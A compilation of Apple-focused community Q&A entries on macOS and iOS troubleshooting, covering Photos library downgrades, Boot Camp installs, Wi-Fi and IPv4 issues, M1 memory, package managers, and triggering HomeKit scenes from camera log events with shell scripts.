+ Arrow Up/Down to quickly switch.\n\nBut if you want to actually have 2 real, completely separate users you either use a second browser (like Chrome) or create 2 macOS user-profiles and switch between them.\n", "Q: Downgraded from Big Sur to Mojave on Macbook Air, Photos app won't open On my Macbook Air, I downgraded from Big Sur to Mojave, and the Photos app won't open. Photos are located on an SD card and not on the MacBook HD. The reason I downgraded was because the essential software I constantly used did not work on Big Sur.\nI simply restored from a backup I had made on Mojave before I got the local Mac service people to install a new (larger) hard drive. It may be (I don't recall) I opened the Photos app when Big Sur was installed, and if so, it may have altered the database setup.\n\nA: It's not truly surprising. Apple frequently makes format/database changes with upgrades. The resulting files are almost never convertible 'downhill', there is simply no provision to be able to do that.\nThere appears to be a 'get out of jail free' card for Photos, though, using iCloud as an intermediary. There is a long [& outdated] explanation on Downgrading a Photos Library to a Previous Version of Photos with the Help of iCloud Photos which I have never tested, so cannot comment on whether it will still work from Big Sur right the way back to Mojave.\nI can confirm that deleting the Big Sur Library, creating a new Photos Lib, making it your System Library and turning on iCloud Photos will download a new Mojave compatible library.\nThis does rather emphasise the need for a solid backup strategy, to prevent issues like this in future. Personally, not only do I keep backups of everything, but before I do any major OS upgrade, I clone my entire boot drive as a 'belt & braces' for if I decide to go back. There are frequently issues trying to go 'downhill' using Time Machine, so I consider this to be a vital step.\n\nA: I believe I found the answer. Go to Finder, then Pictures, then right click Photos library and select Show Package Contents. Select Originals folder and drag to left column of Finder under Pictures or wherever in that column. Open folder and all photos are in numbered folders. Then go to App Store and located in your account there should be the iPhoto app, download and boot it, then under File menu select \"Import to Library' and select the 'Original' folder mentioned above and all your photos/videos load into the iPhoto app. I tried doing the same in the \"Photos' app but it didn't work. iPhoto will do for me for the moment, the only difference \"Photo\" app syncs your pics with other Apple devices, which I'm not interested in. But at least I was able to restore all my inaccessable photos and I'm back in business on my Mac. Possibly when I upgrade to next macOS Photos app will be able to access my pics also.\n", "Q: How to scroll between photos using arrows? I want to open a photo and scroll between all the photos from the same folder using the arrow keys.\nIs there a way to do it using Preview or which software do you suggest to me?\n\nA: The way I do it (and there may be others) involves just the Finder and Quick Look.\nI set the folder of pictures to list view in Finder, select the first picture and press the space bar.

Each filename is important as it gives context to the image, hence me not wanting to use a batch tool to change the names to something shorter but unhelpful.\nI don't mind going through them one by one, but need to know which are the 'offending' filenames/filepaths if I'm to do so.\nIt may be that I can also nest the folders slightly differently if I know which ones are causing the problems, as that may reduce the filepath length.\nIdeally I'm seeking a canny bit of software similar to MassReplaceIt (which I've already used to find and replace 'illegal characters' in the filenames) but can use terminal command if no software exists.\nThanks!\n\nA: Assuming somewhat sane file/folder names\nfind TOPDIR | while read line; do [[ ${#line} -gt 1200 ]] && echo $line; done\n\nwill print all paths/files where the combined length exceeds 1200 characters.

At first I thought it was updating to iOS 14.6; since my second device has an even more recent version, though, I'm wondering if there's some other necessary condition to trigger the folder name change.\nI've found a couple references to this around the internet, but nothing definitive.\n\nA: After I upgraded my first device to iOS 14.7, the subfolder pattern switched back to 100APPLE, 101APPLE, 102APPLE, etc.  This makes me think the date-based folder structure was something specifically done (or perhaps accidentally exposed to users) in iOS 14.6.\n", "Q: Obtaining the Russian Typewriter keyboard layout This is my very first experience with Apple products. For the last 20+ years, I have been using the Russian Typewriter keyboard layout that is available out-of-the-box in all Windows and GNU/Linux distributions.\n(This layout is much more convenient than other Russian layouts, as the digits are typed via Shift, while , and . are available when you press 6 and 7 without Shift. In many other Russian layouts, the comma and the dot are under the right pinky, and sometimes even on the same button, so that you need to use Shift to type a comma.)\nI have tried to find the Russian Typewriter keyboard layout in System Preferences > Keyboard > Input Sources.

Normally, this has to be done on a Windows computer - I used a VMWare Fusion virtual machine. To create the drive using a Mac, please search the internet for a solution as I didn't need to do it.\n\n\n*Remove the USB drive.\n\n\n*Start Boot Camp Assistant, choose the size of the volume for Windows, run the assistant. IMPORTANT! Carefully wait for the moment when the Mac restarts and immediately press and hold Option.\n\n\n*When the option to choose the startup drive appears, normally there should only be one drive on offer - the Windows installation drive created by Boot Camp Assistant. DO NOT choose this but instead insert the USB drive and, when it appears as \"EFI boot\", select it and press enter (make sure your Mac allows booting from USB, if not - restart in Recovery mode and check in Startup Security Utility).\n\n\n*The Windows installation starts from the USB drive. At the point where you need to choose the partition to install Windows to, choose BOOTCAMP.\n\n\n*Let the Windows install.\n\n\n*After the installation, go to the BootCamp folder on drive D: (OSXRESERVED) and run Setup. This will install the missing drivers. I think this part is basically what Boot Camp Assistant would do under normal circumstances.\nThe rest seems to be standard Boot Camp functionality.\n\nA: I would assume that if you previously used the Boot Camp Assistant to install Windows, then somehow when you removed Windows the partitioning was not restored correctly. This probably resulted in the second attempt to install Windows to fail. Below are the commands to remove the existing Windows installation.

Ultimately my whole MacBook Pro started playing up but it turned out this was because I was running unofficial macOS (Big Sur) on my old 2013 model.\nI did a fresh install back to Catalina but this Wi-Fi issue still persisted. What's odd though is that it seems to only have trouble connecting to this network. Other networks or hot spotting to my phone works fine so fortunately its not a hardware issue.\nEach time I click to connect I'm asked for the password and after I enter this hangs about trying to connect for a bit and then says connection failed and I have to restart the whole process again (to no avail). Interestingly, if I enter the wrong password the same thing happens and It doesn't tell me the password is incorrect.\nSomething more fundamental is going wrong I think. Does anyone have any thoughts on how I can go about troubleshooting this issue? I have restarted multiple times, and reset the PRAM, NVRAM etc but no changes.\nUpdate:\n\n\n\nA: From the clear tests you ran thus far, it is clear you dont have\nan hardware problem and not any NVRAM issue.\nYour problem looks like a specific disagreement on the way your router and your Mac manage the attribution of an IP to your Mac to start communicating ( the protocol used for this address attribution is DHCP ).\nYou can trouble check this disagreement by looking on the\n2 sides of the required agreement.\nOn the Mac side\nOpen:\n > System Preferences... > Network\n\nthen select Wi-Fi on the left. You might see that your IP address is something like:\n169.254.xxx.yyy\n\nwhere xxx and yyy are numbers included in [0 - 255].\n( See APIPA address ).\nNext unlock the paddle, click on Advanced... and select Hardware and check your hardware address.\nThis one should like:\nxR:xx:xx:xx:xx:xx\n\nwhere xR and xx are 2-digit hexadecimal numbers ( in [00 - ff] ). If the R digit is:\n2, 6, a or e\n\nthis means that your MAC address is a random one which\nwill change at any new connection attempt.\nAnd the core of the problem is that this is an abnormal\nbehaviour in a normal network\n( this is the normal behaviour of a security tester or a criminal\nwhich would like to enter a target network with a stolen\nMAC address ).\nMost routers configured to put on a minimal security\nwon't accept such a rotating MAC address for a uniq\nmachine, simply because this is not normal user\nbehaviour.\nBut some recent recent versions of iOS ( 14 ) and perhaps\nundocumented updates of MacOS ( more technical investigation needed here )\nare starting to use this MAC address randomization\nfunction to protect users privacy in an hot spot Wi-Fi network. But this approach is a total failure and is breaking the normal use of DHCP.\n[ This caused a huge worldwide surge in support call to\nfix Wi-Fi network failing after recent mobile phones or computers OS upgrades. ]\nOn the router side\nCheck your router configuration which you can probably access\nthrough its router address. You will find this router address\nwithin the submenu:\nAdvanced... > TCP/IP > Router:\n\nand search for the specific DHCP configuration tuning.\n[ If you want specific help to further trouble shoot this side\nof the problem, please provide the brand of your router and\na screen capture of this configuration menu. ]\n", "Q: Can I fit a 12GB tensorflow model in the mac air m1 chip with 16GB Unified RAM I've read that the M1 chip uses a 'unified memory' architecture, where both the CPU and the GPU share RAM.\nIs this equivalent to the VRAM on a traditional NVIDIA GPU?\nE.g. If I have a 12GB tensorflow model, can I load this model into the 16GB RAM space on my M1 Chip?\nEdit: In Addition to the answer below, I have tested out yolov4\nfrom this repo: https://github.com/hunglc007/tensorflow-yolov4-tflite\n python detect.py --weights ./checkpoints/yolov4-416 --size 416 --model yolov4 --image ./data/kite.jpg\n\nInit Plugin\nInit Graph Optimizer\nInit Kernel\nMetal device set to: Apple M1\n\nsystemMemory: 16.00 GB\nmaxCacheSize: 5.33 GB\n\nwhich shows the 5.33 GB VRAM model has a total of ~16GB to work with\n\nA: Apple's \"Unified Memory Architecture\" (UMA) is not exactly the same as what you're used with \"VRAM\" on a traditional Intel system with for example an NVIDIA GPU.\nThe UMA on Apple's M1 chip means that the CPU and GPU accesses the same main memory (system RAM). They access all of it in the same manner, and there's no partitions or similar that prevent either the CPU or the GPU from accessing each other's memory. This means that sending information from the CPU to the GPU, or vice versa, can happens just by reading/writing memory - as opposed to having to transfer data via some secondary means or via special instructions.\nIntel system feature something called Dynamic Video Memory Technology (DVMT), which is actually part of what Intel has named their \"Unified Memory Architecture\". Even though the name is the same, it is not identical.\nUsually on Intel systems that share ordinary system RAM between the CPU and the GPU, you'll see that a certain amount of RAM is pre-allocated to the GPU early during bootup. This amount of \"pre-allocated memory\" is either fixed by the hardware integrator, or it is user customisable via BIOS settings or a UEFI menu. The pre-allocated RAM is not visible by operating systems running on the PCU. This means that even if it attempted to do so and even though it is just ordinary system RAM, the operating system cannot access the pre-allocated memory set aside for the GPU.\nA little later in the boot sequence, the operating system has the option of setting aside so called \"fixed memory\" for the GPU. This memory is permanently allocated to the GPU, and is then no longer accessible by the operating system. However the address space is visible to the operating system in terms of pages tables, and as such it is included in the total amount of system RAM known to the operating system - contrary to the pre-allocated memory.\nLater on in the bootup, the GPU driver running in the operating system can use DVMT to dynamically allocate more of system RAM to be used as graphics memory by the GPU. Uniquely this type of allocation can be retracted so that the memory region can be used by operating system for applications again.\nNote that it is possible to combine these three types of video memory allocations on an Intel system. Note also that it differs from the M1 by the fact that memory is either allocated to the GPU or the CPU - it is not so that for example pre-allocated memory could be shared by the operating system and the GPU for their communication. As soon as the memory is given to the GPU, the programs running on the CPU loose access to it.\nAs for you last question regarding the 12 GB Tensorflow model. Yes, in theory this model can be loaded into the 16 GB of system RAM on the M1. In practice you might run into other things blocking you or slowing down the process. For example a model loaded into RAM usually takes up more space than its on-disk representation.\n", "Q: Browser web page gets sync'd across different macBooks I have 2 macBook Pro's (Catalina and Big Sur) and somehow when I open any web page in Chrome/Brave browser on 1 macBook, it gets synced to the other macBook and a new Chrome icon opens up on the dock.

I turned off bluetooth on my iPhone so it doesn't automatically connect to Airpods yet when I opened the case near my iPhone it still managed to offer option to connect. I saw similar dynamic on iMac when I turned off bluetooth yet I would get option to connect to mouse. Is there another way than bluetooth apple uses to communicate between devices?\n\nA: When you use the Control Center to \"turn off Bluetooth\", you're actually not turning off Bluetooth. Pressing the icon means to disconnect from any connected Bluetooth accessory. It does not disable Bluetooth entirely, and thus a feature such as detecting the Airpods case being opened will continue to work.\nIf you go into Settings > Bluetooth and actually turn Bluetooth off completely, you'll find that the case open detection feature stops working.\n\nA: First off, Apple AirPods and iPhone have more than one way to communicate.\nIndeed iPhone uses Bluetooth protocol and hardware to transmit audio to the AirPods and from the AirPods microphones.\nBut AirPods also have a new way for short-distance data sharing called NFMI (Near Field Magnetic Induction) which is used to transmit status information when you open the lid near the iPhone.\nThis mechanism is so low on energy - that is is by definition always on.

I want to make sure I have the right cable ordered in advance that will let me use this monitor at it's native 2560 x 1440  resolution and I am not sure what my options are, and whether I just need a single cable or some adapter.\nThere were some limitations on driving it at full resolution via HDMI, but I think that was a limitation on older Macs, not the monitor.\n\nA: Any USB-C or Thunderbolt 3 to HDMI or DisplayPort cable should work.\nBoth USB-C and Thunderbolt 3 supports display output at the desired resolution.\nFor example this cable would work.\n", "Q: Fink, Homebrew, MacPorts, pkgsrc — can I run them in parallel on the same machine? I've been using Homebrew on my Mac forever, but sometimes I run into situations where a package is not available.\nFor maximum choice, which of the 4 major package managers (am I missing any?) can be installed alongside each other, without undefined behavior?\nI assume it gets ugly unless one picks a primary package manager, and then just uses other ones for very targeted, narrow installs that don't duplicate dependencies etc.\n\nA: I've had MacPorts and Homebrew coexist with no problems. Take my answer with a grain of salt, though, since I use MacPorts very rarely (1-2 times a year).\n\nA: I have been successfully running Homebrew and Fink on my Mac Mini (late 2012) through the last 4 OS updates.\nI have not had a problem with them co-existing.\nI have not seen duplicated dependancies or conflicts, as versioning is at the application level, not the package manager,.\nJust a small note: Homebrew uses /usr/local by default, which shouldn't really matter, but is not in the unix-tradition and might cause problems if you’ve already installed anything there (MySQL, etc.), or if there is a package installed in a unknown path from another package manager.\n\n*\n\n*To your point, I have had all four installed at one point in High/Sierra, but I removed the others as what I needed was available in Fink and HomeBrew. *\n\n", "Q: No option to send Photos to iCloud I want to backup the photos I have in an iPhone 8 (iOS 14.6) with iCloud, but I don't see the option anywhere.\nIn Settings -> Apple ID -> iCloud, I see a list of apps using iCloud, with toggles to enable or disable it for each app, but Photos doesn't show there.\nIf I search \"iCloud\" in the search bar in settings, it shows \"Photos | Apple ID -> iCloud\", but when I select it, it shows me that same list that I mentioned above.\nIf I go to Settings -> Photos, I also don't see any option to sync them with iCloud.\nAnd if I select any picture, it also doesn't show my any option to send it to iCloud.\nIn icloud.com -> Photos, it tells me to go to iCloud photos in my device and turn it on, but like I said, I don't see that option.\nHow can I enable it?\n\nA: Strange. My iPhone (14.6) displays under Settings > Photos following:\n\n", "Q: Apple Music \"share song\" not showing up when I have the same song on my local library on macOS Big Sur How can I share the link of a song to a friend when I have the exact same music (matched) in my library?\nThe \"share to\" button simple does not show up.\nAs an example:\n\n\nA: You can't. Keep in mind a \"matched\" song can be a home demo or a commercially available song but either way, you aren't able to share those with other users. The workaround is to search for the identical song in Apple Music, i.e. not My Library, and share it from there.\nWish they would update the product to allow sharing of matched, commercially available songs but they haven't yet.\n", "Q: Can I transfer only a few things by using migration assistant? So, I just recently got an M1 MacBook. I'm currently typing this on a mid-2014 Intel core MacBook Pro that's running on Yosemite. I wanted to transfer all my files into the new MacBook, however, I realized that it would take way too long, and I have a lot of junk that  I don't want on my new MacBook.\nIs there a way to transfer only specific things that I want through migration assistant? Mainly some downloaded music from iTunes and some folders, not too many things (though it would probably be a few GB's.) but I don't want everything.\n\nA: In the Mac Migration Assistant process, it will give you some options to select the types of data you can migrate over from your user account, such as music, documents, etc... but it's not going to give you a full list of all directories and files to pick from. \n\nThere's an article here that also discussed this topic: https://forums.macrumors.com/threads/selecting-folders-with-migration-assistant.1743009/\n", "Q: Do I still get credited for move and stand goals if my Apple Watched is locked while on my wrist? One thing I've been curious about and tried to check but haven't been able to fully confirm, is - if my Apple Watch is on my wrist but still locked (i.e. I just put it back on my wrist and have not put in my passcode):\n\n*\n\n*If I move around, will I get credited for that fitness activity?\n(i.e. Will the active calories, exercise and stand rings still go up)\nif I later remember to put in my passcode?\n\n*Will the watch do heartrate and other readings and add that to Health when locked?\n\n\nA: Billie Hawkins has noted about the stand goals. I checked to see if the Apple Watch would track steps.\nSo here was my test:\n\n*\n\n*Take off Apple Watch (Series 3)\n\n*Verify locked state\n\n*Checked number of steps using   Pedometer++ on iPhone (current steps: 8367)\n\n*Walk for 3 minutes around the house\n\n*Checked number of steps on Pedometer++ (steps shown: 8367)\n\n*Unlocked Apple Watch\n\n*Noticed that Pedometer++ changed the number of steps to 8664 (which is about right for me walking 3 mins in the house)\n\n*Verified number of steps on Pedometer++ Watch app (confirmed 8664 steps)\n\nSo, yes, the Apple Watch will track your steps if it is locked but will update after it has been unlocked.\n\nA: I was curious too. In my tests, while locked, the watch didn't do a step count as I walked to the mailbox (about 150 feet), but it did count towards my stand goal.\n", "Q: How to install TigerVNC on MacOS?

How can the described problem be solved?\n\nA: There does not seem to be any documentation from Apple on changes related to SMB in iOS/iPadOS 14.5. However, the following configuration change on the Samba server restores Files app functionality:\n\n*\n\n*Install the Samba package containing VFS modules (on Ubuntu via apt install --no-install-recommends samba-vfs-modules)\n\n*Add the following line to your Samba configuration (on Ubuntu in /etc/samba/smb.conf) in the [global] section or in the relevant share section:\nvfs objects = fruit streams_xattr\n\n*Restart Samba (on Ubuntu via systemctl restart smbd.service)\n\nYou might need to reconnect the share in the Files app. Afterwards, saving new files to the share should work again.\nDocumentation for the fruit SAMBA VFS module can be found at https://www.samba.org/samba/docs/current/man-html/vfs_fruit.8.html.\n", "Q: Set the list separator in Mac In Windows, List separator (, as shown in my system) is a parameter that we could set:\n\nI'm trying to find this setting in my Mac, but I could not find it. Here is the only thing I could find:\n\nIt seems that this separator is used to separate arguments in Excel functions.\nDoes anyone know how to set the list separator in Mac?\nPS: I'm using Mac OS Big Sur 11.4\n\nA: \nIt seems that this separator is used to separate arguments in Excel functions.\n\nYes, it is used to delimit arguments in Excel functions and as the default field separator when saving Excel spreadsheets as CSV files. \nHowever, it is only used if \"Use system separators\" is set in Excel's advanced options (which it is by default). And this setting can be overridden with Excel's own settings.\nI'm not actually aware of any other (office) applications that actually use this system setting. (Although no doubt there are.) AFAIK, LibreOffice Calc uses only its own internal settings (Tools > Options > LibreOffice Calc > Foruma > Separators > Function).\n\nDoes anyone know how to set the list separator in Mac?\n\nAFAIK there is no explicit setting for this in MacOS. It is instead deduced from the \"Decimal\" setting under \"Number separators\" (and \"Currency\"?) in the regional settings. ie. If a comma is used as the \"Decimal\" number separator (as in your screensheet) then a comma cannot be used as the \"list separator\" in Excel, so will instead default to a ; (semicolon). If instead a dot (.) is used as the \"Decimal\" separator, then a comma can be used as the \"list separator\".\nThis answer to a related question on Superuser.com suggests that it is dependent on both the \"Decimal\" settings of \"Number separators\" and \"Currency\", although it's not clear to me why \"Currency\" would be significant here (at least not for the function argument delimiter).\nFurther reference:\n\n*\n\n*Formula errors in Excel when list separator is not set correctly\n\n*Superuser.com - Function argument delimiter - Excel 2011 for Mac OS X\n\n*StackOverflow.com - How to change the excel function separator “;” to “,”? on MacOS\n", "Q: No IPv4 access on my Macbook Pro, only IPv6 works MacBook Pro (13-inch, 2017, Two Thunderbolt 3 ports) / macOS Big Sur 11.4\nI'm experiencing a weird WiFi issue at our remote office where I'm only able to connect to IPv6 addresses and not IPv4 addresses. Ping does not work, ping6 works. Local DNS works as ping6 resolves correctly. I can access google.com in my browser (resolves to an IPv6) but not stackoverflow.com (resolves to an IPv4).\n\nI've tried rebooting both my machine as well as the router. My iPhone works correctly on the network and shows similar values for the network addresses. My mobile hotspot works and other WiFis work on the Macbook. Internet is working for everyone else and everything was working fine in May when I last connected to this network (I did update from Mojave to Big Sur in the meantime but otherwise the set-up should be the same).\nI've tried switching IPv6 to link-local only, configured IPv4 manually, removed external DNS addresses, disabled all proxies, turned the firewall off, flushed the DNS cache, booted to safe mode, disabled IPv6 completely via Terminal, uninstalled NordVPN, and done other things I don't even remember anymore and I've run out of things to try.\nI don't have access to configure the router, but aside from that does anybody have any ideas?\n\nA: I had an issue with the same symptoms after I upgraded to macos 12.5. Specifically any network interface (wifi, wired, or iphone-tether) would only get an IPv6 address and not an IPv4 address.\nThis was on my work Macbook Pro (M1), and I am fortunate enough to have got through to a knowledgeable IT support rep, who went through a barrage of troubleshooting steps.  The action that worked in my case was:\n\n*\n\n*In /Library/Preferences/SystemConfiguration/, move the following files to a Desktop folder:\n\n\ncom.apple.airport.preferences.plist\ncom.apple.network.identification.plist\ncom.apple.wifi.message-tracer.plist\nNetworkInterfaces.plist\npreferences.plist\n\n\n\n*Reboot\n\nAfter that, I was able to get DHCP IPv4 addresses again and IPv4 networking worked as expected.\n\nA: There’s not much you can do without outside help when the network is not supplying IPv4 via DHCP and your attempt to manually find a working gateway and DNS fail.\nI would probably reach for a VPN to get away from that subnet, but presumably you’re on this network for more than just internet access?\nEngaging with the support organization for this office network may be the correct next step after running out of any other alternatives.\n", "Q: Is it possible to set an environment variable for a user, not just a shell? I'm looking for a way to have some environment variables set for every application.\nFrom what I read there are multiple possible files such as ~/.profile, ~/bash_profile, ~/.zshenv etc.  But everything I can find seems to be about setting environment variables for the shell (i.e.: when I open a Terminal). Famously macOS changed from having default bash to default zsh.\nI want to set these environment variables for my whole login, even GUI apps which are not (obviously) associated with any shell session.\nI have, of course, tried ~/.profile but this did not work.

I'm using Neovim and my configuration for Zathura is in zathurarc. I would like to remove the title bar shown in the image and I tried looking up stuff here zathura manual but with no success. I believe this is not a problem on Linux but only on Mac. Can anyone help?\n\nA: Zathura as a program has no control over it's \"title bar\", that is created by the window manager of whatever desktop you are using. On macOS, that would be aqua, which as far as I know will put a title bar on every window unless the program has an option to ignore aqua explicitly written into it's code (e.g. apps like alacritty or iterm).\nThe reason you may not have the same problem on linux is that Zathura will use whatever your window managers' decorations are, i.e. on something like i3 or bspwm it would use the *px border, and on something like openbox or Unity you would have a \"title bar\" similar to that of macOS.\n", "Q: How to safely recover my High Sierra GUID partition that has become FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF after deleting Kubuntu partition? I got a 2011 mac mini with High Sierra on it few years ago and installed bootcamp, then 10.7, then linux (kubuntu). After running out of space in high sierra and windows, I decided to delete the linux partition and expanded the 10.7 partition. Now it will only boot into windows or 10.7 by holding option key, HS doesn't show up in boot manager.\nMy questions are: Can I fix this from where I'm now, booted into 10.7 (Lion)?

There are two good choices, and which you choose is up to you.  I recommend the Run Shell Script action for its speed and compactness, but the Run AppleScript action will likely be easier for you to adapt to other situations in the future:\n1) Run Shell Script :\n\n*\n\n*If your preferred shell is zsh or bash, or one of these options is present in the list, then you can use the code below with the following parameters selected for the action:\n → Shell: /bin/zsh or /bin/bash\n → Input: as arguments \nCheck the path to the chosen shell matches the shebang (#!/path/to/shell) on the first line of this script, editing it as required:\n#!/bin/zsh\n\nalias rename=echo\n# alias rename='mv -n'\n\nfor f in \"$@\" ; do\n     rename \"$f\" \"${f%#*}.${f##*.}\"\ndone\n\nThis script is safe to run \"as is\", as it will not perform any file operations just yet.  It will print each filepath followed by the proposed path of the renamed file on a single line, one line per file.  If the result looks good, you can remove the # preceding alias rename='mv -n', after which, any susbsequent invocation of the script will perform the file operations that will rename the files.\n\n\n*\n\n*If you use FiSH as your preferred shell, select it from the list of options, and apply the following parameters to the action (the path to your FiSH shell may be different, e.g. /usr/local/bin/fish):\n → Shell: /usr/bin/fish\n → Input: as arguments \nEdit the shebang on the first line to reflect the actual path to FiSH:\n#!/usr/bin/fish\n\nfunction mv\n     echo $argv \\n\nend\n\nfor filepath in $argv\n    mv -n \"$filepath\" ( string replace -r \\\n                        -- '(?x) \\# [0-9]+ \n                            (?=\\.[^.]+$)' \\\n                           '' \"$filepath\" )\nend\n\nThis is safe to run \"as is\", and will only print the proposed renaming next to the original filepath, one per line for each file.

Here's how.\n[NOTE: I've tested this method successfully in the \"Big Sur\" and \"Catalina\" versions of macOS.]\n\nEasy way: the \"defaults\" command\nQuit Mail.app if it's running, and then open Terminal and execute the following command:\ndefaults delete -app Mail MessageListFont\n\nThe next time you launch Mail, you'll find the message-list font has reverted to the system default.

Activity Monitor can indicate processes that are Not responding:\n\nIs there a way to find these processes using command line? Such as with ps, ...\n\nA: As far as I know, no such Terminal utility is included with macOS.\nThe standard tools such as ps interact with BSD-style processes on the POSIX layer. ps can tell you the state of the process such as the process being \"dead\", which means a process whose parent is not aware that it has completed running, or the process state being \"uninterruptible waiting\", which means a process that has asked the kernel to do something which it is waiting for.\nTools such as ps are not aware of whether or not processes are \"responding\" in the context that you have here. The \"Not responding\" label shown in Activity Monitor means that the application (not process, but application) is no longer processing events in its main GUI event loop (i.e. a Cocoa run loop).\nI don't know of any third party utility that allows you to list the non-responding processes from the command line, so I decided to make one. You can download it from here:\nhttps://github.com/jksoegaard/NonResponding\nYou can download the ready to use binary, or use Xcode to compile it on your own Mac.\nTechnical note: The program uses a \"deprecated\" function in order to obtain the information, we're looking for. That the function is deprecated does not mean that it doesn't work, or that it is as such problematic to use it right now. It means that the function will probably be removed from a future version of macOS. The function was deprecated in macOS 10.9, but so far no release version of macOS has a replacement for the function. The upcoming macOS Monterey (10.12) includes a new framework named MetricKit that has an alternative function for querying information about app responsiveness. When Monterey is released it could be possible to use this function instead (depending on what is included in the actual final release of Monterey).\n", "Q: View contents of a second monitor on the primary display I have a requirement to be able to see what is being displayed on the second monitor connected to a macbook on the primary display.

Neither is free, but such is life.\nAlternately, MacOS (since High Sierra, I think) allows you to arrange multiple displays in complex ways. You could add a third display (or an iPad, if your system supports SideCar), and mirror that to your secondary display, leaving your primary display in extended desktop mode with the secondary. Apple's instructions are here.\n", "Q: Macbook \"press and hold power button for 10 seconds\"? In the official Apple support guide to reset the SMC of a Mac with the T2 chip, it says:\n\nBefore resetting the SMC, try these steps:\n\n*\n\n*Shut down your Mac.\n\n*Press and hold the power button for 10 seconds, then release the button.\n\n*Wait a few seconds, then press the power button to turn on your Mac.\n\n\n\nWhat does step 2 do?\n\nA: Step 2 simply tells the hardware that you want the SMC chip cache to be reset. It in itself likely doesn't do anything other than differentiate to the hardware your intention. This way, there is no confusion between a 'normal' power button press and one that requests resets.\n\nA: Step 2 is a forced shutdown of the machine. Internally it likely causes the system to clean out a few caches, run some verification checks, and the like, because the system assumes a forced shutdown means the user experienced a problem. In effect, these three steps ask you to do a normal shutdown (so you don't lose open data), start the machine and immediately perform a forced shutdown, and then restart it to see if that fixed the problem.\nIt's a bit more high-tech than slapping the side of the computer to see if that sorts it out, but kind of in the same spirit.\n", "Q: bootcamp earphones constant high pitch sound regardless of sound level I installed windows 10 and everything was running smoothly until a day later when my earphones suddenly started emitting a high pitch noise whenever any sound was played at a constant level.\nIt is pretty much unusable unless I want tinnitus :( I'm not sure what the issue is, I’ve tried reinstalling the drivers but that hasn’t helped.\nI have cirrus logic cs8409 (ab 51) drivers and when I switch drivers to generic or endpoint, I get no audio.\n\nA: I've installed the Windows 11 Preview instead of Windows 10 and it's helped.\n\nA: I don't understand why this worked, but this person's solution did the trick: https://www.reddit.com/r/bootcamp/comments/pwy9xp/high_pitched_sound_when_plugging_in_earphones/hesbd6g/?context=3\nI had my computer set to automatically boot into Windows, but holding down option (Alt on a windows keyboard) during boot, and then selecting the windows partition fixed it!\n", "Q: How to remove unused Menu Bar items I have some Menu Bar items which I don't use (the bar on top of screen), any advice how to remove them?

Just deleting an app from /Applications does not remove all traces an app. The traces are usually in ~/Library or /Library, but can be elsewhere.\nInstructions for Razer Synapse uninstall are here wikiHow.\nYou will need to do your own searches to find uninstall instructions for your other apps.\nAlternatively get a quality app uninstaller (which will likely not be free).

Why do I have a 209.7 MB disk?\n\nA: The T7 SSD has been converted/erased to APFS. The macOS operating system automatically creates a small EFI partition at the beginning of drives with a GPT and size above a certain limit. I suppose this is done incase you choose to install a operating system now or in the future. You can not accidentally eject an external drive that is in use by an application. You can select \"Full Disk Access\" under the Privacy tab of the Security & Privacy pane in the System Preferences application to add applications. This may reduce the prompt for access.\n", "Q: Can I trigger a HomeKit scene when my laptop's camera is turned on or off? Like a lot of people nowadays, I'm set up in a home office and I'm often on video calls on my MacBook Pro.  My partner sometimes wants to come into my office, but doesn't want to interrupt a video call.  We've got a Hue bulb in the landing outside my office, so I was wondering whether I could use that to show whether I'm on a call.  Can I trigger a HomeKit scene based on whether my laptop's camera is turned on or off?\n\nA: With the Shortcuts app and its shortcuts command line utility, it's now possible to trigger specific shortcuts that control your HomeKit scenes and accessories.\nOverall steps\n\n*\n\n*Identify events for your triggers.\n\n*Use the Shortcuts app to create shortcuts that trigger your desired HomeKit actions.\n\n*Create a script that triggers shortcuts when the camera turns on/off.\n\n*Run the script manually or automatically.\n\nIdentify events for your triggers\nAs of MacOS 12.1 Monterey, the Post event kCameraStreamStart and kCameraStreamStop events referenced in the answer by anonymous are no longer logged, but there are new equivalents. It's likely that the event logs may change over time, so first check that these are still correct.\nIn Terminal, run this to filter the logs to the expected messages as of Monterey:\nlog stream | /usr/bin/grep -E 'UVCAssistant:.*(stop|start) stream'\n\nWhile that's running, open the Photo Booth app. You'll hopefully see lines like these output from the filtered log stream when the camera starts and stops (when you quit the app).\n2022-01-04 14:56:58.628006-0500 0xb35b3    Default     0x18025b             266    0    UVCAssistant: (UVCFamily) [com.apple.UVCFamily:device] UVCUSBDeviceStreamingInterface: 0x1000005a6 [0x7fcd7bd08260] [start stream] format : UVCDeviceStreamFormat:[1280 * 720 (YUV420_420v)] [0x7fcd7bd08e90] [subtype 4] frameInterval : 333333\n2022-01-04 14:57:31.179027-0500 0xb2227    Default     0x1803a4             266    0    UVCAssistant: (UVCFamily) [com.apple.UVCFamily:device] UVCUSBDeviceStreamingInterface: 0x1000005a6 [0x7fcd7bd08260] [stop stream] format : UVCDeviceStreamFormat:[1280 * 720 (YUV420_420v)] [0x7fcd7bd08e90] [subtype 4] frameInterval : 333333\n\nIf you get output, you're done with this step and can use the the regular expression matchers I provide in the next steps.\nIf you get no output, you'll need to broaden the filter to search for event logs that appear when the camera starts and stops. This might be a good starting place:\nlog stream | /usr/bin/grep -iE 'UVCAssistant|camera|stream|tccd'\n\nEnsure the events you choose are emitted for any camera use (e.g. Zoom, Meet), not just PhotoBooth.\nYou'll need to come up with a regular expression for grep that matches only when your camera is toggled on or off. If you have multiple cameras, you may also want to test switching between cameras.\nCreate Shortcuts to trigger HomeKit actions\nFirst, confirm that you're able to use the Home app on your Mac to trigger changes to whatever accessories or scenes you're interested in.\nIn the Shortcuts app, create a new shortcut (+ button). For toggling a light, you'll need a separate shortcut for each state (e.g. on/off). Give the shortcut a name such as Turn on lamp.\nFor each shortcut, select the Home app and add its Control <home name> action to your shortcut (drag or double-click). Select the specific scene or accessory you want to control, and select a state for you to set it to when the shortcut runs.\n\nWhen complete, you should see your shortcuts in your shortcuts list and be able to run them and trigger your expected behavior.\n\nLast, confirm that you can trigger these successfully via the Terminal command line:\nshortcuts run 'Turn on lamp'\nshortcuts run 'Turn off lamp'\n\nTrigger shortcuts on camera state\nCreate a script file (e.g. camera-lamp.sh) that, while running, will toggle your light based on whether the camera is running. A starter example:\n#!/bin/bash\nexec log stream |\n  /usr/bin/grep -E --line-buffered 'UVCAssistant:.*(stop|start) stream' | # filter log events\n  tee /dev/stderr |                           # output matching events for debugging\n  /usr/bin/sed -Eu 's/.*(start|stop).*/\\1/' | # reduce the log message down to a single word identifying the event/state\n  while read -r event; do                     # store that word in the $event variable\n    echo \"Camera $event\"\n    if [ 